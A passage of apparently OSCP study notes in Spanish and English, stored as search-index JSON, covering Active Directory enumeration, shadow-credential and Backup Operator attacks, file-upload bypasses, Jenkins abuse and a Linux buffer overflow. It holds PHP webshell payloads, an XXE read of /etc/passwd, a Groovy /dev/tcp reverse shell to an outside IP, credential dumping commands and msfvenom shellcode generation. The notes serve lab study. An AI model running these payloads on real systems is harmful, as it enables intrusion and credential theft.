PowerView","text":""},{"location":"OSCP/aclAdEnum/#export-powerviewcsv","title":"Export-PowerViewCSV","text":"<p>Exporta objetos a un archivo CSV de manera segura para hilos. - <code>Get-DomainUser | Export-PowerViewCSV -Path \"users.csv\"</code></p>"},{"location":"OSCP/aclAdEnum/#get-domainspnticket","title":"Get-DomainSPNTicket","text":"<p>Solicita un ticket de servicio Kerberos para un SPN especificado. - <code>Get-DomainSPNTicket -SPN \"HTTP/web.testlab.local\"</code> - <code>Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat</code></p>"},{"location":"OSCP/aclAdEnum/#get-domaintrust","title":"Get-DomainTrust","text":"<p>Retorna todas las relaciones de confianza de dominio para el dominio actual o un dominio especificado. - <code>Get-DomainTrust</code></p>"},{"location":"OSCP/aclAdEnum/#get-foresttrust","title":"Get-ForestTrust","text":"<p>Retorna todas las relaciones de confianza de bosque para el bosque actual o un bosque especificado. - <code>Get-ForestTrust</code></p>"},{"location":"OSCP/aclAdEnum/#get-pathacl","title":"Get-PathAcl","text":"<p>Enumera las ACL para una ruta de archivo especificada. - <code>Get-PathAcl \"\\\\SERVER\\Share\"</code></p>"},{"location":"OSCP/aclAdEnum/#find-domainuserlocation","title":"Find-DomainUserLocation","text":"<p>Encuentra m\u00e1quinas de dominio donde usuarios espec\u00edficos est\u00e1n conectados. - <code>Find-DomainUserLocation -UserName \"jdoe\"</code></p>"},{"location":"OSCP/aclAdEnum/#find-domainshare","title":"Find-DomainShare","text":"<p>Encuentra comparticiones accesibles en m\u00e1quinas de dominio. - <code>Find-DomainShare</code></p>"},{"location":"OSCP/aclAdEnum/#get-domaingroupmember","title":"Get-DomainGroupMember","text":"<p>Retorna los miembros de un grupo de dominio espec\u00edfico. - <code>Get-DomainGroupMember -Identity \"Domain Admins\"</code></p>"},{"location":"OSCP/adTools/","title":"A lot of AD tools","text":""},{"location":"OSCP/adTools/#tools-for-ad-pentesting","title":"Tools for AD pentesting","text":"Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting. BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment. SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. BloodHound.py A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis. Kerbrute A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing. Impacket toolkit A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. Responder Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions. Inveigh.ps1 Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. C# Inveigh (InveighZero) The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes. rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL. Rubeus Rubeus is a C# tool built for Kerberos Abuse. GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users. Hashcat A great hashcracking and password recovery tool. enum4linux A tool for enumerating information from Windows and Samba systems. enum4linux-ng A rework of the original Enum4linux tool that works a bit differently. ldapsearch Built in interface for interacting with the LDAP protocol. windapsearch A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. DomainPasswordSpray.ps1 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. LAPSToolkit The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). smbmap SMB share enumeration across a domain. psexec.py Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell. wmiexec.py Part of Impacket toolset, it provides the capability of command execution over WMI. Snaffler Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. smbserver.py Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. setspn.exe Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. Mimikatz Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host. secretsdump.py Remotely dump SAM and LSA secrets from a host. evil-winrm Provides us with an interactive shell on host over the WinRM protocol. mssqlclient.py Part of Impacket toolset, it provides the ability to interact with MSSQL databases. noPac.py Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. rpcdump.py Part of the Impacket toolset, RPC endpoint mapper. CVE-2021-1675.py Printnightmare PoC in python. ntlmrelayx.py Part of the Impacket toolset, it performs SMB relay attacks. PetitPotam.py PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. gettgtpkinit.py Tool for manipulating certificates and TGTs. getnthash.py This tool will use an existing TGT to request a PAC for the current user using U2U. adidnsdump A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer. gpp-decrypt Extracts usernames and passwords from Group Policy preferences. GetNPUsers.py Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set. lookupsid.py SID bruteforcing tool. ticketer.py A tool for creation and customization of TGT/TGS tickets. raiseChild.py Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation. Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security). Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). ADRecon A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state."},{"location":"OSCP/addKeyCredentialLink/","title":"AddKeyCredentialLink Attack","text":""},{"location":"OSCP/addKeyCredentialLink/#que-es","title":"\u00bfQu\u00e9 es?","text":"<ul> <li>Es un ataque que permite a un atacante agregar credenciales a un usuario sin necesidad de conocer la contrase\u00f1a.</li> <li>Se puede hacer con cualquier usuario, pero es m\u00e1s efectivo con usuarios de alto privilegio.</li> </ul>"},{"location":"OSCP/addKeyCredentialLink/#video","title":"Video","text":""},{"location":"OSCP/addKeyCredentialLink/#ataque-explicado","title":"Ataque explicado","text":"<ul> <li>En este ejemplo el usuario marcus puede agregar credenciales a la computadora ZPH-SVRMGMT1.ZSM.LOCAL.</li> <li>Entonces lo que podemos hacer es usar la herramienta pywhisker para agregar credenciales a un usuario sin necesidad de conocer la contrase\u00f1a.<ul> <li><code>python3 pywhisker.py -d \"zsm.local\" -u \"marcus\" -p '!QAZ2wsx' --target \"ZPH-SVRMGMT1$\" --action \"add\"</code></li> </ul> </li> </ul> <pre><code>... etc\n--target \"ZPH-SVRMGMT1$\" --action \"add\"\n[*] Searching for the target account\n[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating KeyCredential\n[*] KeyCredential generated with DeviceID: 65727581-ddcd-d67a-efb2-b30390b73d68\n[*] Updating the msDS-KeyCredentialLink attribute of ZPH-SVRMGMT1$\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Converting PEM -&gt; PFX with cryptography: 3cwbk8w6.pfx\n[+] PFX exportiert nach: 3cwbk8w6.pfx\n[i] Passwort f\u00fcr PFX: LlnaSQgj2Xgivmptjc7S\n[+] Saved PFX (#PKCS12) certificate &amp; key at path: 3cwbk8w6.pfx\n[*] Must be used with password: LlnaSQgj2Xgivmptjc7S\n[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\n</code></pre> <ul> <li> <p>Importante la contrase\u00f1a: LlnaSQgj2Xgivmptjc7S</p> </li> <li> <p>Luego con la otra herramienta PKINITtools podemos obtener un TGT.</p> <ul> <li><code>python3 gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem DOMAIN/USER</code></li> <li>en este caso ser\u00eda: <code>python3 gettgtpkinit.py -cert-pem 3cwbk8w6.pem -key-pem 3cwbk8w6.key ZSM.LOCAL/marcus cache.ccache</code></li> </ul> </li> <li>Despu\u00e9s hay que exportar el ticket: <code>export KRB5CCNAME=$PWD/cache.ccache</code></li> <li>Fijamos que est\u00e9 cargado con <code>klist</code></li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/PKINITtools]\n\u2514\u2500$ python3 gettgtpkinit.py -cert-pem /home/kali/Desktop/boxes/certified/xBWiCOIx_cert.pem -key-pem /home/kali/Desktop/boxes/certified/xBWiCOIx_priv.pem CERTIFIED.HTB/MANAGEMENT_SVC management_svc.ccache\n2025-04-09 20:22:14,587 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2025-04-09 20:22:14,594 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2025-04-09 20:22:36,051 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2025-04-09 20:22:36,051 minikerberos INFO     4de618e5fea336c8dbd69b96766e6a9c183b924f4880652b1662841d6fc7ef95\nINFO:minikerberos:4de618e5fea336c8dbd69b96766e6a9c183b924f4880652b1662841d6fc7ef95\n2025-04-09 20:22:36,053 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n</code></pre>"},{"location":"OSCP/addKeyCredentialLink/#conseguir-nt-hash-del-usuario","title":"Conseguir NT hash del usuario","text":"<ul> <li>El comando anterior nos tuvo que haber dado un as-rep hash.</li> <li>Con este hash podemos solicitar con getnthash.py el NT.</li> <li><code>python3 getnthash.py -key AS-REP-ENCRYPTION-KEY DOMAIN/USER</code></li> <li>El as-rep encryption key es el que nos dio el comando anterior.</li> <li>Y esto te va a dar el NT-HASH recuperado.</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/PKINITtools]\n\u2514\u2500$ python3 ./getnthash.py -key 4de618e5fea336c8dbd69b96766e6a9c183b924f4880652b1662841d6fc7ef95 CERTIFIED.HTB/MANAGEMENT_SVC\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Using TGT from cache\n[*] Requesting ticket to self with PAC\nRecovered NT Hash\na091c1832bcdd4677c28b5a6a1295584\n</code></pre>"},{"location":"OSCP/arbitraryFileUpload/","title":"Arbitrary File Upload","text":"<ul> <li>Este tipo de ataque se basa en intentar subir archivos arbitrarios a una aplicaci\u00f3n web.</li> <li>Generalmente se consiguen mediante features de una aplicaci\u00f3n para subir imagenes o cualquier tipo de archivo.</li> </ul>"},{"location":"OSCP/arbitraryFileUpload/#bypassear-filtros","title":"Bypassear filtros","text":""},{"location":"OSCP/arbitraryFileUpload/#whitelist-filters-bypass","title":"Whitelist filters bypass","text":"<ul> <li>El servidor web solo permite solo ciertos tipos de archivos.</li> </ul>"},{"location":"OSCP/arbitraryFileUpload/#double-extensions","title":"Double extensions","text":"<ul> <li>Si el servidor web solo permite archivos con extensiones especificas, se puede intentar subir archivos con extensiones duplicadas.</li> <li>wordlist de extensiones</li> <li>ejemplo: shell.jpg.php</li> </ul>"},{"location":"OSCP/arbitraryFileUpload/#reverse-double-extensions","title":"Reverse double extensions","text":"<ul> <li>Es lo mismo que extensiones dobles, pero en este caso se puede intentar subir archivos con extensiones inversas.</li> <li>ejemplo: php.jpg</li> <li>wordlist de extensiones dobles php</li> </ul>"},{"location":"OSCP/arbitraryFileUpload/#character-injection","title":"Character injection","text":"<ul> <li>Se puede intentar subir archivos con caracteres especiales en su nombre.</li> <li><code>%20</code></li> <li><code>%0a</code> -<code>%00</code></li> <li><code>%0d0a</code></li> <li><code>/</code></li> <li><code>.\\</code></li> <li><code>.</code></li> <li><code>\u2026</code></li> <li><code>:</code><ul> <li>ejemplo: shell.php%00.jpg</li> </ul> </li> </ul>"},{"location":"OSCP/arbitraryFileUpload/#codigo-para-generar-permutaciones-de-caracteres-en-bash","title":"C\u00f3digo para generar permutaciones de caracteres en bash","text":"<pre><code>for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '\u2026' ':'; do\n    for ext in '.php' '.phps'; do\n        echo \"shell$char$ext.jpg\" &gt;&gt; wordlist.txt\n        echo \"shell$ext$char.jpg\" &gt;&gt; wordlist.txt\n        echo \"shell.jpg$char$ext\" &gt;&gt; wordlist.txt\n        echo \"shell.jpg$ext$char\" &gt;&gt; wordlist.txt\n    done\ndone\n</code></pre>"},{"location":"OSCP/arbitraryFileUpload/#mime-type-filters-bypass","title":"MIME type filters bypass","text":"<ul> <li>El servidor web solo permite ciertos tipos de archivos basados en su MIME type.</li> <li>wordlist de content types</li> <li>ejemplo: shell.php con content type image/jpeg</li> <li>GIF8 (GIF) o JFIF (JPEG) al principio del archivo esto hace que el servidor lo interprete como una imagen.</li> </ul>"},{"location":"OSCP/arbitraryFileUpload/#svg-xxe-file-upload","title":"SVG + XXE file upload","text":"<ul> <li>Se puede intentar subir un archivo SVG con un XXE payload.</li> </ul> <p><pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;svg&gt;&amp;xxe;&lt;/svg&gt;\n</code></pre> - Podemos poner wrappers de p <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt; ]&gt;\n&lt;svg&gt;&amp;xxe;&lt;/svg&gt;\n</code></pre></p>"},{"location":"OSCP/arbitraryFileUpload/#magic-bytes-attack","title":"Magic bytes attack","text":"<ul> <li>Se puede intentar subir un archivo con magic bytes que hagan que el servidor lo interprete como un archivo diferente.</li> <li>m\u00e1s info</li> <li>m\u00e1s info x2</li> <li>esto se basa en la firma de los archivos, por ejemplo, un archivo .jpg empieza con (en hexadecimal) <code>FF D8 FF E0 00 10 4A 46 49 46 00 01</code></li> <li>podemos hacer lo siguiente: <pre><code>AAAA\n&lt;?php echo system($_GET[\"cmd\"]);?&gt;\n</code></pre></li> <li>Lo guardamos como shell.phar.jpeg</li> <li>Cambiamos el mymetype utilizando hexeditor, poniendo los numeros magicos reemplazando los valores AAAA: <code>FF D8 FF DB</code> <pre><code>- Tambi\u00e9n para PNG se puede hacer lo siguiente:\n\n```bash\n#!/bin/sh\necho '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r &gt; mime_shell.php.png\necho '&lt;?php system($_REQUEST['cmd']); ?&gt;' &gt;&gt; mime_shell.php.png\n</code></pre></li> </ul> <ul> <li>Alternativa</li> </ul> <pre><code>#!/bin/bash\n# Crear el encabezado PNG (opcional si se necesita disfrazar como imagen)\necho -ne '\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A' &gt; mime_shell.php.png\n# Agregar el c\u00f3digo PHP correctamente escapado\necho '&lt;?php system($_REQUEST[\"cmd\"]); ?&gt;' &gt;&gt; mime_shell.php.png\n</code></pre>"},{"location":"OSCP/arbitraryFileUpload/#subir-htaccess-para-ejecutar-php","title":"Subir .htaccess para ejecutar php","text":"<ul> <li>Se puede intentar subir un archivo .htaccess para ejecutar el archivo php.</li> <li><code>SetHandler application/x-httpd-php</code></li> <li><code>AddType application/x-httpd-php .jpg</code></li> <li>etc</li> <li>Esto sirve para ejecutar archivos php en un servidor web que no permite la ejecuci\u00f3n de archivos php.<ul> <li>Muchas veces no est\u00e1 correctamente bloqueado el acceso a subir archivos .htaccess, por lo tanto podemos subir un archivo .htaccess y ejecutar el archivo php.</li> </ul> </li> </ul>"},{"location":"OSCP/attacking-jenkins/","title":"Attacking Jenkins","text":""},{"location":"OSCP/attacking-jenkins/#comandos","title":"Comandos","text":"<ul> <li>Para realizar un ataque de inyecci\u00f3n de comandos tenemos que ir a <code>/script</code>.<ul> <li>Acepta Groovy script</li> </ul> </li> <li>Ejemplo: <pre><code>def cmd = 'id'\ndef sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = cmd.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln sout\n</code></pre></li> </ul>"},{"location":"OSCP/attacking-jenkins/#otro-ejemplo","title":"Otro ejemplo","text":"<pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre>"},{"location":"OSCP/backupOperatorToDomainAdmin/","title":"Backup Operator to Domain Admin Attack","text":""},{"location":"OSCP/backupOperatorToDomainAdmin/#video","title":"Video","text":""},{"location":"OSCP/backupOperatorToDomainAdmin/#que-es","title":"\u00bfQu\u00e9 es?","text":"<ul> <li>Es un ataque que permite a un atacante escalar privilegios de Backup Operator a Domain Admin.</li> <li>Se basa en la capacidad de los operadores de backup de realizar copias de seguridad de los controladores de dominio.</li> <li>Los operadores de backup pueden leer y escribir en los controladores de dominio.</li> </ul>"},{"location":"OSCP/backupOperatorToDomainAdmin/#ataque-explicado","title":"Ataque explicado","text":"<p> - En este ejemplo el usuario melissa es miembro de Backup Operators.</p>"},{"location":"OSCP/backupOperatorToDomainAdmin/#mi-propio-metodo","title":"Mi propio metodo","text":"<ul> <li>https://github.com/G4sp4rCS/backup-operator-to-domain-admin-POC</li> <li>Script automatizado compatible con evil-winrm y powershell.</li> </ul>"},{"location":"OSCP/backupOperatorToDomainAdmin/#metodo-1-con-impacket","title":"Metodo 1 con impacket","text":"<ul> <li>Abris un smbserver con impacket<ul> <li><code>impacket-smbserver -smb2support \"share\" .</code></li> </ul> </li> <li>Luego con el usuario backup operator podes hacer un backup de los archivos del DC<ul> <li><code>impacket-reg domain/melissa@IP-DE-COMPUTADORA-QUE-MELISSA-PUEDE-ACCEDER backup -o \\\\IP-DE-TU-MAQUINA\\share</code></li> </ul> </li> <li>Entonces con secretsdump podes obtener las credenciales de los usuarios<ul> <li><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</code></li> <li>Y con esto es muy probable que nos de un hash con un usuario que nos deje hacer un DCSync.</li> </ul> </li> </ul>"},{"location":"OSCP/backupOperatorToDomainAdmin/#metodo-2-con-backupoperatortoda","title":"Metodo 2 con BackUpOperatorToDA","text":"<ul> <li>Sitio oficial de la herramienta</li> <li>Nos descargamos el .exe y lo ponemos en la maquina que tiene el rol de backup operator.</li> <li>Tiras con impacket: <code>impacket-smbserver -smb2support \"share\" .</code></li> <li>Y desde la otra PC: <code>.\\BackupOperatorToDA_release.exe -t \\\\IP-DE-TU-MAQUINA\\share -u melissa -p LA-PASSWORD -d DOMAIN.LOCAL</code></li> <li>Luego es lo mismo, secretsdump + dcsync.</li> </ul>"},{"location":"OSCP/bloodhound/","title":"BloodHound","text":""},{"location":"OSCP/bloodhound/#initialize","title":"Initialize","text":"<ul> <li><code>sudo neo4j console</code></li> <li>Now we need to change the default credentials for neo4j. Navigate to http://localhost:7474/ and login with the default credentials <pre><code>username: neo4j\npassword: neo4j\n</code></pre></li> </ul>"},{"location":"OSCP/bloodhound/#bloodhound-python","title":"BloodHound Python","text":"<ul> <li>This package contains a Python based ingestor for BloodHound, based on Impacket. BloodHound.py currently has the following limitations: * Supports most, but not all BloodHound (SharpHound) features. Primary missing features are GPO local groups and some differences in session resolution between BloodHound and SharpHound. * Kerberos authentication support is not yet complete, but can be used from the updatedkerberos branch.</li> </ul>"},{"location":"OSCP/bloodhound/#executing-bloodhoundpy","title":"Executing BloodHound.py","text":"<ul> <li><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></li> </ul>"},{"location":"OSCP/bloodhound/#simple-bash-script-to-do-this","title":"Simple bash script to do this","text":"<pre><code>#!/bin/bash\n# bloodhound-python -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -gc &lt;domain&gt; -c all -ns &lt;ip of domain&gt; \n\necho \"Domain: \"\nread domain \n\necho \"Username: \"\nread username\n\necho \"Password: \"\nread password\n\necho \"IP of Domain: \" \nread ip_address\n\nbloodhound-python -d $domain -u $username -p $password -gc $domain -c all -ns $ip_address\n</code></pre>"},{"location":"OSCP/bloodhound/#sharphound","title":"Sharphound","text":"<ul> <li>C# Data Collector for BloodHound</li> <li><code>Import-Module .\\SharpHound.ps1</code></li> <li><code>C:\\Tools\\SharpHound.exe -c All -d INLANEFREIGHT.LOCAL --zipfilename loot.zip</code></li> <li><code>Invoke-Bloodhound -CollectionMethod All -Domain inlanefreight.local -ZipFileName loot.zip</code> </li> </ul>"},{"location":"OSCP/bloodhound/#bloodhound-automation-quick-wins-scans","title":"Bloodhound automation quick wins scans","text":""},{"location":"OSCP/bufferOverflow/","title":"Buffer Overflow","text":"<ul> <li>Buffer overflow escausado cuando un programa grandes cantidades de datos que no caben en el buffer que se le asign\u00f3.</li> <li>Un buffer overflow puede causar que el programa crashee, corrompa datos o da\u00f1e estrucuturas del runtime del programa.</li> <li>Esto puede causar que se pueda sobreescribir la direcci\u00f3n de retorno con datos arbitrarios. Permitiendo a un at acante ejecutar comandos con el privilegio de ese programa.</li> <li>La mayor causa de los buffer overflows son los lenguajes de programaci\u00f3n que no monitorean los limites de la memoria asignada a un buffer o stack.</li> </ul>"},{"location":"OSCP/bufferOverflow/#buffer-overflow-en-linux","title":"Buffer Overflow en Linux","text":""},{"location":"OSCP/bufferOverflow/#buffer-overflow-en-windows","title":"Buffer Overflow en Windows","text":""},{"location":"OSCP/bufferOverflowLinux/","title":"Buffer Overflow en Linux","text":""},{"location":"OSCP/bufferOverflowLinux/#apunte-de-arquitectura-y-organizacion-del-computador-2","title":"Apunte de Arquitectura y Organizaci\u00f3n del computador 2","text":""},{"location":"OSCP/bufferOverflowLinux/#entender-la-pila","title":"Entender la pila","text":""},{"location":"OSCP/bufferOverflowLinux/#programa-vulnerable-en-c","title":"Programa vulnerable en C","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint bowfunc(char *string) {\n\n    char buffer[1024];\n    strcpy(buffer, string);\n    return 1;\n}\n\nint main(int argc, char *argv[]) {\n\n    bowfunc(argv[1]);\n    printf(\"Done.\\n\");\n    return 1;\n}\n</code></pre> <ul> <li>Ac\u00e1 la funci\u00f3n bowfunc toma de parametro un puntero a un string y lo copia a un buffer de 1024 bytes.</li> <li>Esto es vulnerable pues no se chequea si el tama\u00f1o del string es mayor a 1024 bytes. Permitiendo que se sobreescriba la direcci\u00f3n de retorno de la funci\u00f3n bowfunc.</li> <li>De todas formas las distribuciones GNU/Linux modernas tienen protecciones contra este tipo de ataques.<ul> <li>Conocida como Address Space Layout Randomization (ASLR) que randomiza la direcci\u00f3n de memoria de las funciones y variables.</li> <li>De todas formas como root se puede desactivar.</li> </ul> </li> </ul> <pre><code>student@nix-bow:~$ sudo su\nroot@nix-bow:/home/student# echo 0 &gt; /proc/sys/kernel/randomize_va_space\nroot@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space\n\n0\n</code></pre>"},{"location":"OSCP/bufferOverflowLinux/#compilar-a-32-bits","title":"Compilar a 32 bits","text":"<pre><code>student@nix-bow:~$ sudo apt install gcc-multilib\nstudent@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32\nstudent@nix-bow:~$ file bow32 | tr \",\" \"\\n\"\n</code></pre>"},{"location":"OSCP/bufferOverflowLinux/#compilar-a-64-bits","title":"Compilar a 64 bits","text":"<pre><code>student@nix-bow:~$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64\nstudent@nix-bow:~$ file bow64 | tr \",\" \"\\n\"\n</code></pre>"},{"location":"OSCP/bufferOverflowLinux/#funciones-de-c-a-tener-en-cuenta-que-pueden-ser-vulnerables","title":"Funciones de C a tener en cuenta que pueden ser vulnerables","text":"<ul> <li>strcpy</li> <li>gets</li> <li>sprintf</li> <li>strcat</li> <li>scanf</li> <li>Estas funciones no protegen la memoria independientemente. Por lo tanto si se les pasa un string mayor al buffer que se les asign\u00f3, se puede sobreescribir la direcci\u00f3n de retorno de la funci\u00f3n.</li> </ul>"},{"location":"OSCP/bufferOverflowLinux/#gnu-debugger-gdb","title":"GNU Debugger (GDB)","text":"<ul> <li><code>set disassembly-flavor intel</code></li> <li><code>disassemble main</code></li> <li><code>echo 'set disassembly-flavor intel' &gt; ~/.gdbinit</code></li> <li>GDB Dashboard: https://github.com/cyrus-and/gdb-dashboard</li> <li>Object dump con intel: <code>objdump -d -M intel bow32</code></li> </ul>"},{"location":"OSCP/bufferOverflowLinux/#instruction-pointer","title":"Instruction Pointer","text":"<ul> <li>Uno de los aspectos m\u00e1s importantes del stack-based buffer overflow es tomar control del EIP/RIP.</li> <li>El EIP/RIP es el registro que contiene la direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n que se va a ejecutar.<ul> <li>As\u00ed podemos saber cual es la proxima direcci\u00f3n a la que hay que saltar para cuando tengamos que insertar shellcode en el return address.</li> </ul> </li> <li>El proceso visual se puede ver algo as\u00ed:</li> <li></li> </ul>"},{"location":"OSCP/bufferOverflowLinux/#determinar-el-offset","title":"Determinar el offset","text":"<ul> <li>El offset se determina por cuantos bytes son necesarios para sobre-escribir el buffer y cuanto espacio tiene que tener nuestro shellcode.</li> <li>En este caso utilizamos el framework de metasploit para esto.</li> <li><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txt</code></li> <li>Ahora reepmplazamos el string que se le pasa a bowfunc por el contenido de pattern.txt</li> </ul>"},{"location":"OSCP/bufferOverflowLinux/#utilizando-gdb-para-determinar-el-offset","title":"Utilizando GDB para determinar el offset","text":"<ul> <li><code>(gdb) run $(python -c \"print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'\")</code></li> </ul>"},{"location":"OSCP/bufferOverflowLinux/#gdb-eiprip","title":"GDB EIP/RIP","text":"<ul> <li><code>(gdb) info registers eip</code><ul> <li>Se tiene que notar que el EIP/RIP da una direcci\u00f3n de memoria distinta a la que se le pas\u00f3 al programa.</li> <li>Podemos utilizar otra herramienta de metasploit para determinar el offset.</li> <li><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569</code><ul> <li>Siendo 0x69423569 la direcci\u00f3n que nos di\u00f3 el EIP/RIP.</li> </ul> </li> <li></li> </ul> </li> <li>Ahora si sabemos cuantos bytes son necesarios para llegar al EIP/RIP, agregamos como PoC n cantidad de bytes y el offset que nos di\u00f3 pattern_offset.rb.</li> <li>Ejemplo: <code>(gdb) run $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")</code></li> </ul> <pre><code>The program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\n</code></pre> <p>![]https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png) - Ahora sabemos que el offset es de cierta cantidad de bytes, lo siguiente ser\u00eda insertar un shellcode en el EIP/RIP.</p>"},{"location":"OSCP/bufferOverflowLinux/#determinar-la-longitud-del-shellcode","title":"Determinar la Longitud del Shellcode","text":""},{"location":"OSCP/bufferOverflowLinux/#generacion-del-shellcode","title":"Generaci\u00f3n del Shellcode","text":"<p>Usamos Metasploit para generar un shellcode. Por ejemplo:</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 --platform linux --arch x86 --format c\n</code></pre> <p>Este shellcode suele pesar 68 bytes.</p>"},{"location":"OSCP/bufferOverflowLinux/#uso-de-nops","title":"Uso de NOPs","text":"<p>Se emplea la instrucci\u00f3n NOP (<code>\\x90</code>) para crear un \"sled\" que garantice la ejecuci\u00f3n correcta del shellcode. La idea es llenar todo el buffer hasta alcanzar la direcci\u00f3n de retorno (EIP/RIP).</p>"},{"location":"OSCP/bufferOverflowLinux/#ejemplo-de-payload-en-gdb","title":"Ejemplo de Payload en GDB","text":"<p>Ejecutamos el programa vulnerable con un payload formado por: - Un relleno inicial (por ejemplo, con <code>\\x55</code> para marcar la parte sobrescrita). - Una zona de NOPs. - El shellcode. - Un sobrescrito final (por ejemplo, 4 bytes espec\u00edficos para identificar el EIP).</p> <pre><code>(gdb) run $(python -c 'print \"\\x55\" * (1040 - 100 - 150 - 4) + \"\\x90\" * 100 + \"\\x44\" * 150 + \"\\x66\" * 4')\n</code></pre>"},{"location":"OSCP/bufferOverflowLinux/#imagenes-de-apoyo","title":"Im\u00e1genes de 